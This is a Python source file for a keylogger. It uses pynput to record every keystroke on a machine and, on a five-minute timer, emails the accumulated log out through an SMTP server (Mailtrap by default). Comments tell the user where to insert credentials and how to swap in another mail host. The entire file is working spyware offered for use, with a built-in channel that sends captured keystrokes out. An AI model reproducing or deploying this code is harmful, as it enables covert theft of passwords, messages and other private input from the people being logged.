import smtplib
import threading
import time
from email.mime.text import MIMEText
from pynput import keyboard

EMAIL_ADDRESS = "" ## add your username here from the SMTP server. Mailtrap is recommended. 
EMAIL_PASSWORD = "" ## add your password here of the SMTP server. 
SEND_REPORT_EVERY = 300 ## this is seconds. you can adjust it that after how much time you will receive the logs.

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "[SPACE]"
            elif key == key.esc:
                current_key = "[ESC]"
            elif key == key.backspace:
                current_key = "[Key.backspace]"
            elif key == key.shift:
                current_key = "[Key.shift]"
            else:
                current_key = " " + str(key) + " "
                
        self.appendlog(current_key)
        
    def send_mail(self, email, password, message):
        sender = "Sender Name <youremailaddresss@domain.com>"
        receiver = "Reciver Name <youremailaddresss@domain.com>" ## Use the same email address, if you want to receive the logs to the same email address!
        
        msg = MIMEText(message)
        msg['Subject'] = "Keylogger UPDATE"
        msg['From'] = sender
        msg['To'] = receiver
        
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 587) as server: ## I have used the Mailtrap here. But you can use any SMTP provider. Change the "sandbox.smtp.mailtrap.io" with your SMTP host, and "587" with the port.
            server.login(email, password)
            server.send_message(msg)
            
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
            
    def start(self):
        threading.Thread(target=self.run).start()

keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.start()
